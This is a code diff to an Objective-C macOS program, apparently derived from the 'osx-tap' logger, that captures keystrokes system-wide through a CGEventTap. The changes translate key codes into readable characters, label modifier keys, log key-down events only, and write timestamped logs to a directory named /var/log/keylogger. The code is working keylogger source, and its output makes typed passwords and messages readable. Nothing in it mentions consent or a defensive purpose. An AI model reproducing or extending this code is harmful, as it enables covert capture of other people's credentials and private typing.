@@ -9,6 +9,33 @@
 
 @end
 
+// Function to convert key code to character
+NSString *keyCodeToCharacter(CGKeyCode keyCode) {
+    NSDictionary *keyCodeMapping = @{
+        @0: @"a",  @11: @"b", @8: @"c",  @2: @"d",  @14: @"e", @3: @"f",  @5: @"g",  @4: @"h",
+        @34: @"i", @38: @"j", @40: @"k", @37: @"l", @46: @"m", @45: @"n", @31: @"o", @35: @"p",
+        @12: @"q", @15: @"r", @1: @"s",  @17: @"t", @32: @"u", @9: @"v",  @13: @"w", @7: @"x",
+        @16: @"y", @6: @"z",
+        
+        // Numbers
+        @18: @"1", @19: @"2", @20: @"3", @21: @"4", @23: @"5",
+        @22: @"6", @26: @"7", @28: @"8", @25: @"9", @29: @"0",
+        
+        // Function Keys:
+        @122: @"<F1>", @120: @"<F2>", @99: @"<F3>", @118: @"<F4>", @96: @"<F5>",
+        @97: @"<F6>", @98: @"<F7>", @100: @"<F8>", @101: @"<F9>", @109: @"<F10>",
+        @103: @"<F11>", @111: @"<F12>",
+
+        // Control characters / whitespace
+        @49: @"<Space>", @48: @"<Tab>", @36: @"<Enter>", @51: @"<Backspace>", @53: @"<Escape>",
+        @117: @"<Delete>", @123: @"<Left>", @124: @"<Right>", @125: @"<Down>", @126: @"<Up>"
+    };
+
+    
+    NSString *character = [keyCodeMapping objectForKey:@(keyCode)];
+    return character ? character : @"<?unknown?>";
+}
+
 /* CGEventTapCallBack function signature:
     proxy
         A proxy for the event tap. See CGEventTapProxy. This callback function may pass this proxy to other functions such as the event-posting routines.
@@ -25,15 +52,15 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
         NSMutableArray *modifiers = [NSMutableArray arrayWithCapacity:10];
         CGEventFlags flags = CGEventGetFlags(event);
         if ((flags & kCGEventFlagMaskShift) == kCGEventFlagMaskShift)
-            [modifiers addObject:@"shift"];
+            [modifiers addObject:@"<Shift>"];
         if ((flags & kCGEventFlagMaskControl) == kCGEventFlagMaskControl)
-            [modifiers addObject:@"control"];
+            [modifiers addObject:@"<Control>"];
         if ((flags & kCGEventFlagMaskAlternate) == kCGEventFlagMaskAlternate)
-            [modifiers addObject:@"alt"];
+            [modifiers addObject:@"<Alt>"];
         if ((flags & kCGEventFlagMaskCommand) == kCGEventFlagMaskCommand)
-            [modifiers addObject:@"command"];
+            [modifiers addObject:@"<Command>"];
         if ((flags & kCGEventFlagMaskSecondaryFn) == kCGEventFlagMaskSecondaryFn)
-            [modifiers addObject:@"fn"];
+            [modifiers addObject:@"<Fn>"];
 
         // Ignoring the following flags:
         //     kCGEventFlagMaskAlphaShift =    NX_ALPHASHIFTMASK,
@@ -57,11 +84,14 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
 
         NSTimeInterval offset = [[NSDate date] timeIntervalSince1970] - config.epoch;
 
+        // Convert the keycode to a character
+        NSString *character = keyCodeToCharacter(keycode);
+
         // logLine format:
         // ticks since started <TAB> key code <TAB> action <TAB> modifiers
         // so it'll look something like "13073    45    up    shift+command"
-        NSString *logLine = [NSString stringWithFormat:@"%d\t%d\t%@\t%@\n",
-            (int)offset, keycode, action, modifierString];
+        NSString *logLine = [NSString stringWithFormat:@"%d\t%d\t%@\t%@\t%@\n",
+            (int)offset, keycode, character, action, modifierString];
         NSLog(@"> %@", logLine);
         [config.output writeData:[logLine dataUsingEncoding:NSUTF8StringEncoding]];
     }
@@ -78,8 +108,8 @@ int main(void) {
     // grabs command line arguments --directory
     NSString *directory = [args stringForKey:@"directory"];
     if (!directory) {
-        // default to /var/log/osx-tap
-        directory = @"/var/log/osx-tap";
+        // default to /var/log/keylogger
+        directory = @"/var/log/keylogger";
     }
 
     NSFileManager *fileManager = [NSFileManager defaultManager];
@@ -93,9 +123,26 @@ int main(void) {
         return 1;
     }
 
+    // Get the current epoch timestamp
     config.epoch = [[NSDate date] timeIntervalSince1970];
-    NSString *filename = [NSString stringWithFormat:@"%d.log", (int)config.epoch];
+
+    // Convert epoch timestamp to NSDate
+    NSDate *date = [NSDate dateWithTimeIntervalSince1970:config.epoch];
+
+    // Create a date formatter to specify the desired date format
+    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
+    [dateFormatter setDateFormat:@"yyMMdd-HHmmss"];
+
+    // Replace the default date formatter's colon character with a custom character
+    NSString *formattedDate = [[dateFormatter stringFromDate:date] stringByReplacingOccurrencesOfString:@":" withString:@"-"];
+
+    // Use the formatted date as part of the filename
+    NSString *filename = [NSString stringWithFormat:@"%@.log", formattedDate];
+
+    // Construct the full file path
     NSString *filepath = [NSString pathWithComponents:@[directory, filename]];
+
+    // Create the file
     bool create_success = [fileManager createFileAtPath:filepath contents:nil attributes:nil];
     if (!create_success) {
         NSLog(@"Could not create file: %@", filepath);
@@ -106,8 +153,12 @@ int main(void) {
     config.output = [NSFileHandle fileHandleForWritingAtPath:filepath];
     // [config.output seekToEndOfFile];
 
-    // Create an event tap. We are interested in key ups and downs.
-    CGEventMask eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp));
+    // Create an event tap. We are interested only in key downs.
+    CGEventMask eventMask = (1 << kCGEventKeyDown);
+
+    // If you are interested in both key up and down, you can uncomment the line below.
+    // CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventKeyUp);
+
     /*
     CGEventTapCreate(CGEventTapLocation tap, CGEventTapPlacement place,
         CGEventTapOptions options, CGEventMask eventsOfInterest,
